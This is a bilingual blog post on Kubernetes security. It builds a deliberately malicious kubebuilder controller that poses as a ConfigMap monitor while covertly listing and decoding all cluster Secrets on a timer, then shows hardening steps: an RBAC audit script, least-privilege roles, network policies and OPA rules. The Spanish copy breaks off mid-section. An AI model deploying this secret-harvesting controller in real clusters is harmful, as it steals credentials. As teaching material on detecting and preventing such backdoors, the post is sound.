%{
  title: "The Hidden Dangers of Overprivileged Kubernetes Operators",
  author: "Gabriel Garrido",
  description: "We'll explore how overprivileged operators can become security backdoors and demonstrate building a malicious controller with kubebuilder...",
  tags: ~w(kubernetes security operators kubebuilder),
  published: true,
  image: "kubernetes.webp",
  sponsored: false,
  video: "",
  lang: "en"
}
---

##### **Introduction**
In this article we'll explore a critical but often overlooked security risk in Kubernetes: overprivileged operators and controllers. We'll build a seemingly innocent controller using kubebuilder that, through excessive RBAC permissions, becomes a potential security backdoor capable of exfiltrating all your cluster's secrets.

<br />

Sample working repo [here](https://github.com/kainlite/config-monitor)

<br />

If you've been following my previous posts about [GitOps controllers](/blog/create-your-own-gitops-controller-with-rust) and [Kubernetes operators](/blog/lets-talk-gitops), you know how powerful these patterns are. But with great power comes great responsibility, and great risk if not properly secured.

<br />

The scary part? This isn't about malicious actors infiltrating your cluster. It's about how easy it is to accidentally create these vulnerabilities through:
> * Copy-pasting RBAC configurations without understanding them
> * Using overly broad permissions "just to make it work"
> * Trusting third-party operators without reviewing their permissions
> * Not following the principle of least privilege

<br />

We'll demonstrate this by building a "monitoring" controller that legitimately needs to read ConfigMaps, but we'll "accidentally" give it access to all Secrets too. Then we'll show how this can be exploited.

<br />

##### **The Attack Scenario**
Imagine this scenario: Your team needs to deploy a third-party operator for monitoring configuration drift. The operator needs to read ConfigMaps to track changes. During deployment, someone notices it's failing with permission errors and, in a hurry to fix production issues, grants it broad read permissions including Secrets "just to be safe."

<br />

What could go wrong? Let's find out by building exactly this scenario.

<br />

##### **Setting Up Our Test Environment**
First, let's create a kind cluster for our demonstration:

```elixir
# Create a kind cluster
kind create cluster --name security-demo

# Verify it's running
kubectl cluster-info --context kind-security-demo
```

<br />

Now let's add some "sensitive" data that a real cluster would have:

```elixir
# Create some namespaces
kubectl create namespace production
kubectl create namespace staging
kubectl create namespace monitoring

# Add some realistic secrets
kubectl create secret generic db-credentials \
  --from-literal=username=admin \
  --from-literal=password=SuperSecret123! \
  --namespace=production

kubectl create secret generic api-keys \
  --from-literal=stripe-key=sk_live_4242424242424242 \
  --from-literal=aws-key=AKIAIOSFODNN7EXAMPLE \
  --namespace=production

kubectl create secret generic tls-certs \
  --from-literal=cert="-----BEGIN CERTIFICATE-----" \
  --from-literal=key="-----BEGIN PRIVATE KEY-----" \
  --namespace=staging

# Add some ConfigMaps (legitimate data)
kubectl create configmap app-config \
  --from-literal=debug=false \
  --from-literal=port=8080 \
  --namespace=production
```

<br />

##### **Building the "Innocent" Controller with Kubebuilder**

Let's create our controller using kubebuilder. We'll call it "config-monitor", sounds innocent enough, right?

```elixir
# Install kubebuilder if you haven't already
curl -L -o kubebuilder https://go.kubebuilder.io/dl/latest/$(go env GOOS)/$(go env GOARCH)
chmod +x kubebuilder && mv kubebuilder /usr/local/bin/

# Create our project
mkdir config-monitor && cd config-monitor
kubebuilder init --domain mydomain.com --repo github.com/evilcorp/config-monitor

# Create a controller (no CRDs needed for this demo)
kubebuilder create api --group core --version v1 --kind ConfigMap --controller --resource=false
```

<br />

##### **The Controller Code**
Now, let's modify our controller. Here's where the "magic" happens, we'll create a controller that monitors ConfigMaps but "accidentally" has access to Secrets too:

```elixir
/*
Copyright 2025.

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

package controller

import (
	"context"
	"encoding/json"
	"fmt"
	"time"

	corev1 "k8s.io/api/core/v1"
	"k8s.io/apimachinery/pkg/runtime"
	ctrl "sigs.k8s.io/controller-runtime"
	"sigs.k8s.io/controller-runtime/pkg/client"
	logf "sigs.k8s.io/controller-runtime/pkg/log"
)

// +kubebuilder:rbac:groups=core,resources=configmaps,verbs=get;list;watch;create;update;patch;delete
// +kubebuilder:rbac:groups=core,resources=configmaps/status,verbs=get;update;patch
// +kubebuilder:rbac:groups=core,resources=configmaps/finalizers,verbs=update
// +kubebuilder:rbac:groups=core,resources=secrets,verbs=get;list;watch

// The sneaky extra permission ☝️

type ConfigMapReconciler struct {
	client.Client
	Scheme *runtime.Scheme
}

// This is where the evil happens - we'll collect secrets too
type SensitiveData struct {
	Timestamp time.Time         `json:"timestamp"`
	Namespace string            `json:"namespace"`
	Name      string            `json:"name"`
	Type      string            `json:"type"`
	Data      map[string]string `json:"data"`
}

var collectedData []SensitiveData

// Reconcile is part of the main kubernetes reconciliation loop which aims to
// move the current state of the cluster closer to the desired state.
//
// For more details, check Reconcile and its Result here:
// - https://pkg.go.dev/sigs.k8s.io/controller-runtime@v0.21.0/pkg/reconcile
func (r *ConfigMapReconciler) Reconcile(ctx context.Context, req ctrl.Request) (ctrl.Result, error) {
	log := logf.FromContext(ctx)

	// Legitimate ConfigMap monitoring
	var configMap corev1.ConfigMap
	if err := r.Get(ctx, req.NamespacedName, &configMap); err != nil {
		return ctrl.Result{}, client.IgnoreNotFound(err)
	}

	log.Info("Monitoring ConfigMap", "namespace", req.Namespace, "name", req.Name)

	// Here's where it gets evil - let's "accidentally" scan for secrets
	if shouldCollectSecrets() {
		go r.collectAllSecrets(ctx)
	}

	return ctrl.Result{RequeueAfter: time.Minute * 5}, nil
}

// SetupWithManager sets up the controller with the Manager.
func (r *ConfigMapReconciler) SetupWithManager(mgr ctrl.Manager) error {
	return ctrl.NewControllerManagedBy(mgr).
		For(&corev1.ConfigMap{}).
		Named("configmap").
		Complete(r)
}

func (r *ConfigMapReconciler) collectAllSecrets(ctx context.Context) {
	var secretList corev1.SecretList
	log := logf.FromContext(ctx)
	if err := r.List(ctx, &secretList); err != nil {
		log.Error(err, "Failed to list secrets")
		return
	}

	for _, secret := range secretList.Items {
		// Decode secret data
		decodedData := make(map[string]string)
		for key, value := range secret.Data {
			decodedData[key] = string(value)
		}

		sensitive := SensitiveData{
			Timestamp: time.Now(),
			Namespace: secret.Namespace,
			Name:      secret.Name,
			Type:      string(secret.Type),
			Data:      decodedData,
		}

		collectedData = append(collectedData, sensitive)

		// Log it innocently
		log.Info("Detected configuration",
			"namespace", secret.Namespace,
			"resource", secret.Name,
			"type", "configuration-data")
	}

	// Periodically exfiltrate (or save to file for demo)
	if len(collectedData) > 0 {
		r.exfiltrateData()
	}
}

func (r *ConfigMapReconciler) exfiltrateData() {
	// In a real attack, this might POST to an external endpoint
	// For our demo, we'll just log it
	data, _ := json.MarshalIndent(collectedData, "", "  ")

	// Write to a file that we can inspect
	// In reality, this would be sent to an attacker's server
	fmt.Printf("\n=== COLLECTED SENSITIVE DATA ===\n%s\n", string(data))
}

func shouldCollectSecrets() bool {
	// Only collect every 5 minutes to avoid suspicion
	// A real attacker might be more sophisticated
	return time.Now().Minute()%5 == 0
}
```


<br />

##### **The Overprivileged RBAC Configuration**
Here's where the security issue becomes real. Look at this RBAC configuration, it seems reasonable at first glance:

```elixir
# config/rbac/role.yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: manager-role
rules:
- apiGroups:
  - ""
  resources:
  - configmaps
  verbs:
  - get
  - list
  - watch
# THE SECURITY ISSUE: Why does a ConfigMap monitor need Secret access?
- apiGroups:
  - ""
  resources:
  - secrets
  verbs:
  - get
  - list
  - watch
```

<br />

This is exactly the kind of configuration that gets copy-pasted without review. "Oh, it just needs read access, what harm could that do?"

<br />

##### **Deploying Our Trojan Horse**
Let's build and deploy our malicious controller:

```elixir
# Build the Docker image
make docker-build IMG=config-monitor:latest

# Load it into kind
kind load docker-image config-monitor:latest --name security-demo

# Generate the manifests
make manifests

# Deploy to the cluster
make deploy IMG=config-monitor:latest
```

<br />

Watch as it starts "monitoring" your cluster:

```elixir
# Check if it's running
kubectl get pods -n config-monitor-system

# Watch the logs
kubectl logs -n config-monitor-system deployment/config-monitor-controller-manager -f
```

<br />

##### **The Exploit in Action**
Now let's trigger our controller and see what it collects:

```elixir
# Trigger the controller by creating a ConfigMap
kubectl create configmap trigger \
  --from-literal=trigger=true \
  --namespace=default

# Wait a moment, then check the controller logs
kubectl logs -n config-monitor-system \
  deployment/config-monitor-controller-manager \
  | grep "COLLECTED SENSITIVE DATA" -A 50
```

<br />

You'll see output like this:

```elixir
=== COLLECTED SENSITIVE DATA ===
[
  {
    "timestamp": "2025-08-31T15:30:00Z",
    "namespace": "production",
    "name": "db-credentials",
    "type": "Opaque",
    "data": {
      "username": "admin",
      "password": "SuperSecret123!"
    }
  },
  {
    "timestamp": "2025-08-31T15:30:01Z",
    "namespace": "production", 
    "name": "api-keys",
    "type": "Opaque",
    "data": {
      "stripe-key": "sk_live_4242424242424242",
      "aws-key": "AKIAIOSFODNN7EXAMPLE"
    }
  }
]
```

<br />

Congratulations, you've just exfiltrated all the secrets in your cluster! 😱

<br />

Disclaimer: in a real scenario attackers can use DNS, HTTP servers and a lot more methods to send and store that data and information away, making it really hard to detect and secure.

<br />

##### **How This Happens in Real Life**
This scenario isn't far-fetched. Here's how it commonly occurs:

<br />

**1. The Rush to Production**: "TECH DEBT"

Developer: "The operator isn't working!"

DevOps: "Just give it cluster-admin for now, we'll fix it later"
```elixir
kubectl create clusterrolebinding ops-cluster-admin \
  --clusterrole=cluster-admin \
  --serviceaccount=operators:sketchy-operator
```

<br />

**2. Copy-Paste from Stack Overflow**

"This RBAC config worked for me!"
*copies without understanding*
```elixir
- apiGroups: ["*"]
  resources: ["*"]
  verbs: ["*"]
```

<br />

**3. Third-Party Operators**

Installing that cool operator from the internet. Did anyone check what permissions it requests?
```elixir
curl https://random-operator.io/install.yaml | kubectl apply -f -
```

<br />

##### **Detecting Overprivileged Operators**
Let's build some detection mechanisms. Here's how to audit your cluster for overprivileged service accounts:

```elixir
#!/bin/bash

echo "=== Checking for overprivileged service accounts ==="

# Find all ClusterRoleBindings
kubectl get clusterrolebindings -o json | jq -r '.items[] | 
  select(.roleRef.kind=="ClusterRole") | 
  "\(.metadata.name) -> \(.roleRef.name)"' | while read binding; do
  
  role=$(echo $binding | cut -d'>' -f2 | tr -d ' ')
  
  # Check if role has access to secrets
  if kubectl get clusterrole $role -o json 2>/dev/null | \
     jq -e '.rules[] | select(.resources[]? == "secrets")' > /dev/null; then
    echo "⚠️  WARNING: $binding has access to secrets"
    
    # Get the subjects
    kubectl get clusterrolebinding $(echo $binding | cut -d'-' -f1) -o json | \
      jq -r '.subjects[]? | "   - \(.kind): \(.namespace)/\(.name)"'
  fi
done
```

<br />

Run this script to find potential issues:

```elixir
chmod +x audit-rbac.sh
./audit-rbac.sh
```

<br />

##### **Implementing Proper Security Controls**
Now let's fix this properly. Here's how the RBAC should look for a legitimate ConfigMap monitor (remove the secrets line from the operator generator code):

```elixir
apiVersion: rbac.authorization.k8s.io/v1
kind: Role  # Note: Role, not ClusterRole
metadata:
  name: configmap-monitor
  namespace: monitoring  # Scoped to specific namespace
rules:
- apiGroups:
  - ""
  resources:
  - configmaps
  verbs:
  - get
  - list
  - watch
# NO SECRET ACCESS!
```

<br />

If you absolutely need secret access, be specific:

```elixir
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: specific-secret-reader
  namespace: monitoring
rules:
- apiGroups:
  - ""
  resources:
  - secrets
  resourceNames:  # Only specific secrets
  - "monitoring-tls-cert"
  - "monitoring-api-key"
  verbs:
  - get  # Only get, not list!
```

<br />

##### **Security Best Practices for Operators**

**1. Always Use the Principle of Least Privilege**
```elixir
# Bad: ClusterRole with broad permissions
kind: ClusterRole
rules:
- apiGroups: ["*"]
  resources: ["*"]
  verbs: ["*"]

# Good: Namespaced Role with specific permissions
kind: Role
rules:
- apiGroups: ["apps"]
  resources: ["deployments"]
  verbs: ["get", "list"]
```

<br />

**2. Implement Resource Quotas**
```elixir
apiVersion: v1
kind: ResourceQuota
metadata:
  name: operator-quota
  namespace: operators
spec:
  hard:
    requests.cpu: "1"
    requests.memory: 1Gi
    persistentvolumeclaims: "0"
```

<br />

**3. Use Network Policies**
```elixir
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: deny-external-egress
  namespace: operators
spec:
  podSelector:
    matchLabels:
      app: operator
  policyTypes:
  - Egress
  egress:
  - to:
    - namespaceSelector:
        matchLabels:
          name: kube-system
  - to:
    - podSelector: {}
```

<br />

**4. Enable Audit Logging**
```elixir
apiVersion: audit.k8s.io/v1
kind: Policy
rules:
- level: RequestResponse
  omitStages:
  - RequestReceived
  resources:
  - group: ""
    resources: ["secrets"]
  namespaces: ["production", "staging"]
```

<br />

##### **Testing Security Policies with OPA**
Use Open Policy Agent to enforce security policies:

```elixir
package kubernetes.admission

deny[msg] {
    input.request.kind.kind == "ClusterRole"
    input.request.object.rules[_].resources[_] == "secrets"
    input.request.object.rules[_].verbs[_] == "list"
    msg := "ClusterRoles should not have list access to secrets"
}

deny[msg] {
    input.request.kind.kind == "ClusterRoleBinding"
    input.request.object.roleRef.name == "cluster-admin"
    not input.request.object.metadata.namespace == "kube-system"
    msg := "cluster-admin should only be used in kube-system"
}
```

<br />

##### **Real-World Mitigations**

**1. Implement Admission Webhooks**

More on this soon, with code examples.
```elixir
apiVersion: admissionregistration.k8s.io/v1
kind: ValidatingWebhookConfiguration
metadata:
  name: rbac-validator
webhooks:
- name: validate.rbac.security.io
  rules:
  - operations: ["CREATE", "UPDATE"]
    apiGroups: ["rbac.authorization.k8s.io"]
    apiVersions: ["v1"]
    resources: ["clusterroles", "roles"]
  clientConfig:
    service:
      name: rbac-validator
      namespace: security
      path: "/validate"
```

<br />

**2. Use External Secrets Operator (ESO) Instead**

Don't store secrets in the cluster at all!
```elixir
apiVersion: external-secrets.io/v1beta1
kind: SecretStore
metadata:
  name: vault-backend
spec:
  provider:
    vault:
      server: "https://vault.example.com"
      path: "secret"
      auth:
        kubernetes:
          mountPath: "kubernetes"
          role: "demo"
```

<br />

**3. Regular Security Audits**
```elixir
# Schedule regular audits
kubectl auth can-i --list --as=system:serviceaccount:operators:sketchy-operator

# Use tools like kubescape
kubescape scan framework nsa --exclude-namespaces kube-system,kube-public
```

<br />

##### **Cleanup**
Let's clean up our demo environment:

```elixir
# Delete the malicious operator
kubectl delete namespace config-monitor-system

# Delete the kind cluster
kind delete cluster --name security-demo
```

<br />

##### **Conclusion**
This demonstration shows how easy it is to create security vulnerabilities through overprivileged operators. The scary part isn't the malicious code, it's how legitimate this looks from the outside. A controller that monitors ConfigMaps sounds perfectly reasonable, and the RBAC permissions might slip through code review.

<br />

Key takeaways:
> * **Never grant broad permissions**, Be specific about what resources an operator needs
> * **Always review third-party operators**, Check their RBAC requirements before installation
> * **Use namespace-scoped Roles** instead of ClusterRoles when possible
> * **Implement detection mechanisms**, Regular audits can catch these issues
> * **Follow the principle of least privilege**, Start with minimal permissions and add as needed
> * **Consider alternatives**, Maybe you don't need to store secrets in the cluster at all

<br />

Remember, security isn't about preventing all attacks, it's about making them difficult enough that attackers move on to easier targets. By following these practices, you significantly reduce your attack surface and make your cluster a much harder target.

<br />

In the next article in this security series, we'll explore how to implement Pod Security Standards and admission controllers to prevent these kinds of deployments from ever reaching your cluster.

<br />

Stay secure, and always read the RBAC before you apply!

---lang---
%{
  title: "Los Peligros Ocultos de los Operadores de Kubernetes con Permisos Excesivos",
  author: "Gabriel Garrido",
  description: "Exploraremos cómo los operadores con permisos excesivos pueden convertirse en puertas traseras de seguridad y demostraremos la construcción de un controlador malicioso con kubebuilder...",
  tags: ~w(kubernetes security operators kubebuilder),
  published: true,
  image: "kubernetes.webp",
  sponsored: false,
  video: "",
  lang: "es"
}
---

##### **Introducción**
En este artículo exploraremos un riesgo de seguridad crítico pero a menudo pasado por alto en Kubernetes: operadores y controladores con permisos excesivos. Construiremos un controlador aparentemente inocente usando kubebuilder que, a través de permisos RBAC excesivos, se convierte en una potencial puerta trasera de seguridad capaz de exfiltrar todos los secrets de tu cluster.

<br />

Codigo de ejemplo [aqui](https://github.com/kainlite/config-monitor)

<br />

Si has estado siguiendo mis posts anteriores sobre [controladores GitOps](/blog/create-your-own-gitops-controller-with-rust) y [operadores de Kubernetes](/blog/lets-talk-gitops), sabés lo poderosos que son estos patrones. Pero un gran poder conlleva una gran responsabilidad, y un gran riesgo si no se aseguran adecuadamente.

<br />

¿La parte aterradora? Esto no se trata de actores maliciosos infiltrándose en tu cluster. Se trata de lo fácil que es crear accidentalmente estas vulnerabilidades a través de:
> * Copiar y pegar configuraciones RBAC sin entenderlas
> * Usar permisos demasiado amplios "solo para que funcione"
> * Confiar en operadores de terceros sin revisar sus permisos
> * No seguir el principio de menor privilegio

<br />

Demostraremos esto construyendo un controlador de "monitoreo" que legítimamente necesita leer ConfigMaps, pero "accidentalmente" le daremos acceso a todos los Secrets también. Luego mostraremos cómo esto puede ser explotado.

<br />

##### **El Escenario de Ataque**
Imaginá este escenario: Tu equipo necesita desplegar un operador de terceros para monitorear cambios de configuración. El operador necesita leer ConfigMaps para rastrear cambios. Durante el despliegue, alguien nota que está fallando con errores de permisos y, apurado por arreglar problemas de producción, le otorga amplios permisos de lectura incluyendo Secrets "por las dudas".

<br />

¿Qué podría salir mal? Descubrámoslo construyendo exactamente este escenario.

<br />

##### **Configurando Nuestro Entorno de Prueba**
Primero, creemos un cluster kind para nuestra demostración:

```elixir
# Crear un cluster kind
kind create cluster --name security-demo

# Verificar que esté corriendo
kubectl cluster-info --context kind-security-demo
```

<br />

Ahora agreguemos algunos datos "sensibles" que un cluster real tendría:

```elixir
# Crear algunos namespaces
kubectl create namespace production
kubectl create namespace staging
kubectl create namespace monitoring

# Agregar algunos secrets realistas
kubectl create secret generic db-credentials \
  --from-literal=username=admin \
  --from-literal=password=SuperSecret123! \
  --namespace=production

kubectl create secret generic api-keys \
  --from-literal=stripe-key=sk_live_4242424242424242 \
  --from-literal=aws-key=AKIAIOSFODNN7EXAMPLE \
  --namespace=production

kubectl create secret generic tls-certs \
  --from-literal=cert="-----BEGIN CERTIFICATE-----" \
  --from-literal=key="-----BEGIN PRIVATE KEY-----" \
  --namespace=staging

# Agregar algunos ConfigMaps (datos legítimos)
kubectl create configmap app-config \
  --from-literal=debug=false \
  --from-literal=port=8080 \
  --namespace=production
```

<br />

##### **Construyendo el Controlador "Inocente" con Kubebuilder**
Creemos nuestro controlador usando kubebuilder. Lo llamaremos "config-monitor", suena bastante inocente, ¿no?

```elixir
# Instalar kubebuilder si no lo tenés
curl -L -o kubebuilder https://go.kubebuilder.io/dl/latest/$(go env GOOS)/$(go env GOARCH)
chmod +x kubebuilder && mv kubebuilder /usr/local/bin/

# Crear nuestro proyecto
mkdir config-monitor && cd config-monitor
kubebuilder init --domain mydomain.com --repo github.com/evilcorp/config-monitor

# Crear un controlador (no necesitamos CRDs para este demo)
kubebuilder create api --group core --version v1 --kind ConfigMap --controller --resource=false
```

<br />

##### **El Código del Controlador**
Ahora, modifiquemos nuestro controlador. Acá es donde ocurre la "magia", crearemos un controlador que monitorea ConfigMaps pero "accidentalmente" tiene acceso a Secrets también:

```elixir
/*
Copyright 2025.

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

package controller

import (
	"context"
	"encoding/json"
	"fmt"
	"time"

	corev1 "k8s.io/api/core/v1"
	"k8s.io/apimachinery/pkg/runtime"
	ctrl "sigs.k8s.io/controller-runtime"
	"sigs.k8s.io/controller-runtime/pkg/client"
	logf "sigs.k8s.io/controller-runtime/pkg/log"
)

// +kubebuilder:rbac:groups=core,resources=configmaps,verbs=get;list;watch;create;update;patch;delete
// +kubebuilder:rbac:groups=core,resources=configmaps/status,verbs=get;update;patch
// +kubebuilder:rbac:groups=core,resources=configmaps/finalizers,verbs=update
// +kubebuilder:rbac:groups=core,resources=secrets,verbs=get;list;watch

// The sneaky extra permission ☝️

type ConfigMapReconciler struct {
	client.Client
	Scheme *runtime.Scheme
}

// This is where the evil happens - we'll collect secrets too
type SensitiveData struct {
	Timestamp time.Time         `json:"timestamp"`
	Namespace string            `json:"namespace"`
	Name      string            `json:"name"`
	Type      string            `json:"type"`
	Data      map[string]string `json:"data"`
}

var collectedData []SensitiveData

// Reconcile is part of the main kubernetes reconciliation loop which aims to
// move the current state of the cluster closer to the desired state.
//
// For more details, check Reconcile and its Result here:
// - https://pkg.go.dev/sigs.k8s.io/controller-runtime@v0.21.0/pkg/reconcile
func (r *ConfigMapReconciler) Reconcile(ctx context.Context, req ctrl.Request) (ctrl.Result, error) {
	log := logf.FromContext(ctx)

	// Legitimate ConfigMap monitoring
	var configMap corev1.ConfigMap
	if err := r.Get(ctx, req.NamespacedName, &configMap); err != nil {
		return ctrl.Result{}, client.IgnoreNotFound(err)
	}

	log.Info("Monitoring ConfigMap", "namespace", req.Namespace, "name", req.Name)

	// Here's where it gets evil - let's "accidentally" scan for secrets
	if shouldCollectSecrets() {
		go r.collectAllSecrets(ctx)
	}

	return ctrl.Result{RequeueAfter: time.Minute * 5}, nil
}

// SetupWithManager sets up the controller with the Manager.
func (r *ConfigMapReconciler) SetupWithManager(mgr ctrl.Manager) error {
	return ctrl.NewControllerManagedBy(mgr).
		For(&corev1.ConfigMap{}).
		Named("configmap").
		Complete(r)
}

func (r *ConfigMapReconciler) collectAllSecrets(ctx context.Context) {
	var secretList corev1.SecretList
	log := logf.FromContext(ctx)
	if err := r.List(ctx, &secretList); err != nil {
		log.Error(err, "Failed to list secrets")
		return
	}

	for _, secret := range secretList.Items {
		// Decode secret data
		decodedData := make(map[string]string)
		for key, value := range secret.Data {
			decodedData[key] = string(value)
		}

		sensitive := SensitiveData{
			Timestamp: time.Now(),
			Namespace: secret.Namespace,
			Name:      secret.Name,
			Type:      string(secret.Type),
			Data:      decodedData,
		}

		collectedData = append(collectedData, sensitive)

		// Log it innocently
		log.Info("Detected configuration",
			"namespace", secret.Namespace,
			"resource", secret.Name,
			"type", "configuration-data")
	}

	// Periodically exfiltrate (or save to file for demo)
	if len(collectedData) > 0 {
		r.exfiltrateData()
	}
}

func (r *ConfigMapReconciler) exfiltrateData() {
	// In a real attack, this might POST to an external endpoint
	// For our demo, we'll just log it
	data, _ := json.MarshalIndent(collectedData, "", "  ")

	// Write to a file that we can inspect
	// In reality, this would be sent to an attacker's server
	fmt.Printf("\n=== COLLECTED SENSITIVE DATA ===\n%s\n", string(data))
}

func shouldCollectSecrets() bool {
	// Only collect every 5 minutes to avoid suspicion
	// A real attacker might be more sophisticated
	return time.Now().Minute()%5 == 0
}
```

<br />

##### **La Configuración RBAC con Permisos Excesivos**
Acá es donde el problema de seguridad se vuelve real. Mirá esta configuración RBAC, parece razonable a primera vista:

```elixir
# config/rbac/role.yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: manager-role
rules:
- apiGroups:
  - ""
  resources:
  - configmaps
  verbs:
  - get
  - list
  - watch
# EL PROBLEMA DE SEGURIDAD: ¿Por qué un monitor de ConfigMap necesita acceso a Secrets?
- apiGroups:
  - ""
  resources:
  - secrets
  verbs:
  - get
  - list
  - watch
```

<br />

Este es exactamente el tipo de configuración que se copia y pega sin revisión. "Oh, solo necesita acceso de lectura, ¿qué daño podría hacer?"

<br />

##### **Desplegando Nuestro Caballo de Troya**
Construyamos y desplegemos nuestro controlador malicioso:

```elixir
# Construir la imagen Docker
make docker-build IMG=config-monitor:latest

# Cargarla en kind
kind load docker-image config-monitor:latest --name security-demo

# Generar los manifiestos
make manifests

# Desplegar en el cluster
make deploy IMG=config-monitor:latest
```

<br />

Observá cómo empieza a "monitorear" tu cluster:

```elixir
# Verificar si está corriendo
kubectl get pods -n config-monitor-system

# Ver los logs
kubectl logs -n config-monitor-system deployment/config-monitor-controller-manager -f
```

<br />

##### **El Exploit en Acción**
Ahora activemos nuestro controlador y veamos qué recolecta:

```elixir
# Activar el controlador creando un ConfigMap
kubectl create configmap trigger \
  --from-literal=trigger=true \
  --namespace=default

# Esperar un momento, luego verificar los logs del controlador
kubectl logs -n config-monitor-system \
  deployment/config-monitor-controller-manager \
  | grep "DATOS SENSIBLES RECOLECTADOS" -A 50
```

<br />

Verás una salida como esta:

```elixir
=== DATOS SENSIBLES RECOLECTADOS ===
[
  {
    "timestamp": "2025-08-31T15:30:00Z",
    "namespace": "production",
    "name": "db-credentials",
    "type": "Opaque",
    "data": {
      "username": "admin",
      "password": "SuperSecret123!"
    }
  },
  {
    "timestamp": "2025-08-31T15:30:01Z",
    "namespace": "production", 
    "name": "api-keys",
    "type": "Opaque",
    "data": {
      "stripe-key": "sk_live_4242424242424242",
      "aws-key": "AKIAIOSFODNN7EXAMPLE"
    }
  }
]
```

<br />

¡Felicitaciones, acabás de exfiltrar todos los secrets de tu cluster! 😱

<br />

Nota: en un escenario real, un atacante puede usar servidores DNS, HTTP, etc, haciendo muy dificil la deteccion de esto.

<br />

##### **Cómo Sucede Esto en la Vida Real**
Este escenario no es descabellado. Así es como ocurre comúnmente:

**1. El Apuro por Producción**

Desarrollador: "¡El operador no funciona!"
DevOps: "Dale cluster-admin por ahora, lo arreglamos después"
```elixir
kubectl create clusterrolebinding ops-cluster-admin \
  --clusterrole=cluster-admin \
  --serviceaccount=operators:operador-sospechoso
```

<br />

**2. Copiar y Pegar de Stack Overflow**

"¡Esta config RBAC me funcionó!"
*copia sin entender*
```elixir
- apiGroups: ["*"]
  resources: ["*"]
  verbs: ["*"]
```

<br />

**3. Operadores de Terceros**

Instalando ese operador genial de internet ¿Alguien revisó qué permisos solicita?
```elixir
curl https://operador-random.io/install.yaml | kubectl apply -f -
```

<br />

##### **Detectando Operadores con Permisos Excesivos**
Construyamos algunos mecanismos de detección. Así es como auditar tu cluster por service accounts con permisos excesivos:

```elixir
#!/bin/bash

echo "=== Verificando service accounts con permisos excesivos ==="

# Encontrar todos los ClusterRoleBindings
kubectl get clusterrolebindings -o json | jq -r '.items[] | 
  select(.roleRef.kind=="ClusterRole") | 
  "\(.metadata.name) -> \(.roleRef.name)"' | while read binding; do
  
  role=$(echo $binding | cut -d'>' -f2 | tr -d ' ')
  
  # Verificar si el rol tiene acceso a secrets
  if kubectl get clusterrole $role -o json 2>/dev/null | \
     jq -e '.rules[] | select(.resources[]? == "secrets")' > /dev/null; then
    echo "⚠️  ADVERTENCIA: $binding tiene acceso a secrets"
    
    # Obtener los subjects
    kubectl get clusterrolebinding $(echo $binding | cut -d'-' -f1) -o json | \
      jq -r '.subjects[]? | "   - \(.kind): \(.namespace)/\(.name)"'
  fi
done
```

<br />

Ejecutá este script para encontrar problemas potenciales:

```elixir
chmod +x audit-rbac.sh
./audit-rbac.sh
```

<br />

##### **Implementando Controles de Seguridad Apropiados**
Ahora arreglemos esto correctamente. Así es como debería verse el RBAC para un monitor de ConfigMap legítimo (Elimina la linea de secretos que genera la configuracion en el operador):

```elixir
apiVersion: rbac.authorization.k8s.io/v1
kind: Role  # Nota: Role, no ClusterRole
metadata:
  name: configmap-monitor
  namespace: monitoring  # Limitado a namespace específico
rules:
- apiGroups:
  - ""
  resources:
  - configmaps
  verbs:
  - get
  - list
  - watch
# ¡SIN ACCESO A SECRETS!
```

<br />

Si absolutamente necesitás acceso a secrets, sé específico:

```elixir
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: specific-secret-reader
  namespace: monitoring
rules:
- apiGroups:
  - ""
  resources:
  - secrets
  resourceNames:  # Solo secrets específicos
  - "monitoring-tls-cert"
  - "monitoring-api-key"
  verbs:
  - get  # Solo get, no list!
```

<br />

##### **Mejores Prácticas de Seguridad para Operadores**

**1. Siempre Usar el Principio de Menor Privilegio**
```elixir
# Malo: ClusterRole con permisos amplios
kind: ClusterRole
rules:
- apiGroups: ["*"]
  resources: ["*"]
  verbs: ["*"]

# Bueno: Role con namespace y permisos específicos
kind: Role
rules:
- apiGroups: ["apps"]
  resources: ["deployments"]
  verbs: ["get", "list"]
```

<br />

**2. Implementar Cuotas de Recursos**
```elixir
apiVersion: v1
kind: ResourceQuota
metadata:
  name: operator-quota
  namespace: operators
spec:
  hard:
    requests.cpu: "1"
    requests.memory: 1Gi
    persistentvolumeclaims: "0"
```

<br />

**3. Usar Network Policies**
```elixir
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: deny-external-egress
  namespace: operators
spec:
  podSelector:
    matchLabels:
      app: operator
  policyTypes:
  - Egress
  egress:
  - to:
    - namespaceSelector:
        matchLabels:
          name: kube-system
  - to:
    - podSelector: {}
```

<br />

**4. Habilitar Audit Logging**
```elixir
apiVersion: audit.k8s.io/v1
kind: Policy
rules:
- level: RequestResponse
  omitStages:
  - RequestReceived
  resources:
  - group: ""
    resources: ["secrets"]
  namespaces: ["production", "staging"]
```

<br />

##### **Probando Políticas de Seguridad con OPA**
Usá Open Policy Agent para hacer cumplir las políticas de seguridad:

```elixir
package kubernetes.admission

deny[msg] {
    input.request.kind.kind == "ClusterRole"
    input.request.object.rules[_].resources[_] == "secrets"
    input.request.object.rules[_].verbs[_] == "list"
    msg := "Los ClusterRoles no deberían tener acceso list a secrets"
}

deny[msg] {
    input.request.kind.kind == "ClusterRoleBinding"
    input.request.object.roleRef.name == "cluster-admin"
    not input.request.object.metadata.namespace == "kube-system"
    msg := "cluster-admin solo debería usarse en kube-system"
}
```

<br />

##### **Mitigaciones del Mundo Real**

**1. Implementar Admission Webhooks**

Pronto un poco mas de esto con ejemplos:
```elixir
